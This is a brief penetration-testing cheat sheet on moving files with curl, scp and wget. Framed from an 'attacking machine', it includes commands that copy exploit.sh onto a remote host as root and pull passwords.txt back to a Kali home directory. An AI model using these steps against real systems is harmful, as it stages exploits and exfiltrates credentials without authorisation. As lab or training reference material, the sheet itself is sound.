# File Transfer Techniques

## Curl

```bash
curl http://<IP/<File> --output /<Dir>/<File>
curl http://10.10.10.10./notes.txt --output /tmp/notes.txt
```

## SCP

Transfer file from attacking machine to remote host.

```bash
scp <File> <User>@<IP>:/<path>/<File>
scp exploit.sh root@10.10.10.10:/tmp/exploit.sh

# With key file
scp <File> -i <id_rsa> <User>@<IP>:/<path>/<File>
scp exploit.sh -i /home/id_rsa root@10.10.10.10:/tmp/exploit.sh
```

Download from remote host to local system

```bash
scp <User>@<IP>:/<Path>/<File> /<LocalPath>
scp root@10.10.10.10:/tmp/passwords.txt /home/kali/passwords.txt

# With Key File
scp -i <id_rsa> <User>@<IP>:/<Path>/<File> /<LocalPath>
scp -i id_rsa root@10.10.10.10:/tmp/passwords.txt /home/kali/passwords.txt
```

## Wget

```bash
wget http://<IP>/<File>
wget http://10.10.10.10/notes.txt
```

